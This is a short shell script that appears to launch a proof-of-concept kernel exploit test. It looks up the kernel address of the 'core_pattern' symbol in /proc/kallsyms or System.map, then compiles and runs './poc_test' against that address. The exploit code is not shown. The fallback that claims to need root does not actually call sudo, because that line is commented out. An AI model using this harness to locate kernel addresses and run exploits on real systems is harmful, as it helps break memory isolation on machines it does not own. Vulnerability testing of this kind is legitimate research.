#!/bin/sh

find_linux_core_pattern() {
	#$2 sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_core_pattern$/\1/p' $1
	sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* core_pattern$/\1/p' $1
}

echo "looking for linux_core_pattern in /proc/kallsyms"
linux_core_pattern=$(find_linux_core_pattern /proc/kallsyms)
if test -z $linux_core_pattern; then
	echo "protected. requires root"
	linux_core_pattern=$(\
		find_linux_core_pattern /proc/kallsyms sudo)

fi
if test -z $linux_core_pattern; then
	echo "not found. reading /boot/System.map-$(uname -r)"
	linux_core_pattern=$(\
		find_linux_core_pattern /boot/System.map-$(uname -r) sudo)
fi
if test -z $linux_core_pattern; then
	echo "not found. reading /boot/System.map"
	linux_core_pattern=$(\
		find_linux_core_pattern /boot/System.map sudo)
fi
if test -z $linux_core_pattern; then
	echo "can't find linux_core_pattern, unable to test at all"
	exit 0
fi

uname -rvi
head /proc/cpuinfo

./compile.sh
./poc_test $linux_core_pattern 16
